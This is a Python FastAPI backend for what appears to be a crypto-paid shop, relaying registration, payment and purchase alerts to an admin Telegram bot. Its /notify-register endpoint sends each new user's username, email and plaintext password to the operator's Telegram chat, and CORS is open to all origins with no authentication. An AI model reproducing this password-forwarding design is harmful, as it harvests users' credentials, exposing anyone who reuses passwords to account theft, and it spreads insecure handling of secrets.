from fastapi import FastAPI, Request, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import requests
from config import ADMIN_BOT_TOKEN, ADMIN_CHAT_ID, NOWPAYMENTS_API_KEY

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def send_admin_alert(message: str):
    """Sends a notification to the Admin Bot."""
    url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Admin Alert Failed: {e}")

@app.post("/notify-register")
async def notify_register(data: dict):
    msg = (
        f"👤 <b>New User Registered</b>\n\n"
        f"<b>Username:</b> {data.get('username')}\n"
        f"<b>Email:</b> {data.get('email')}\n"
        f"<b>Password:</b> <code>{data.get('password')}</code>"
    )
    send_admin_alert(msg)
    return {"status": "ok"}

@app.post("/notify-payment")
async def notify_payment(data: dict):
    msg = (
        f"💳 <b>New Payment Attempt</b>\n\n"
        f"<b>User:</b> {data.get('email')}\n"
        f"<b>Product:</b> {data.get('product')}\n"
        f"<b>Amount:</b> ${data.get('amount')}\n"
        f"<b>Network:</b> {data.get('network')}\n"
        f"<b>TXID:</b> <code>{data.get('txid')}</code>"
    )
    send_admin_alert(msg)
    return {"status": "ok"}

@app.post("/notify-purchase")
async def notify_purchase(data: dict):
    msg = (
        f"✅ <b>Purchase Successful!</b>\n\n"
        f"<b>User:</b> {data.get('email')}\n"
        f"<b>Product:</b> {data.get('product')}\n"
        f"<b>Status:</b> Delivered"
    )
    send_admin_alert(msg)
    return {"status": "ok"}

@app.post("/create-invoice")
async def create_invoice(data: dict):
    # (Same as before, simplified for demonstration)
    return {"invoice_url": f"https://nowpayments.io/payment?order_id={data.get('order_id')}"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
